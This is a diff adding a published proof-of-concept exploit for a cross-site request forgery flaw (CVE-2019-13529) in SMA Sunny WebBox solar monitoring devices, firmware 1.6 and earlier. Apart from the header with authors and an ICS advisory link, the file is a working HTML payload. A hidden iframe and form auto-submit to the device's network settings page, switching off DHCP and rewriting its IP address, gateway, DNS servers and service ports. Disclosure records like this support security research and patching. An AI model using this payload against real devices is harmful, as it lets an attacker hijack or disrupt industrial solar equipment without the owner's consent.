@@ -1,0 +1,28 @@
+# Exploit Title: SMA Solar Technology AG Sunny WebBox device - 1.6 - Cross-Site Request Forgery
+# Date: 2019-10-08
+# Exploit Author: Borja Merino and Eduardo Villaverde
+# Vendor Homepage: https://www.sma.de
+# Version: Firmware Version 1.6 and prior
+# Tested on: Sunny WebBox SMA Solar Device (Firmware Version 1.6)
+# CVE : CVE-2019-13529
+# ICS-Cert Advisory: https://www.us-cert.gov/ics/advisories/icsa-19-281-01
+
+<!-- Change any hidden value -->
+
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method='POST' action='http://X.X.X.X/wb_network_changed.htm' target="csrf-frame" id="csrf-form">
+  <input type='hidden' name='RadioButtonDhcp' value='off'>
+  <input type='hidden' name='IpAddr' value='1.1.1.1'>
+  <input type='hidden' name='SubnetMask' value='255.255.255.0'>
+  <input type='hidden' name='Gateway' value='1.1.1.1'> 
+  <input type='hidden' name='DnsIpAddr' value='5.5.5.1'>
+  <input type='hidden' name='Dns2IpAddr' value='5.5.5.2'>
+  <input type='hidden' name='StaticNatPortHttp' value='80'>
+  <input type='hidden' name='WebserverPort' value='80'>
+  <input type='hidden' name='WebservicePort' value='80'>
+  <input type='hidden' name='RadioButtonModbus' value='off'>
+  <input type='hidden' name='ModbusPort' value='502'>
+  <input type='hidden' name='BConfirm' value='Confirmar'>
+  <input type='submit' value='submit'>
+</form>
+<script>document.getElementById("csrf-form").submit()</script>
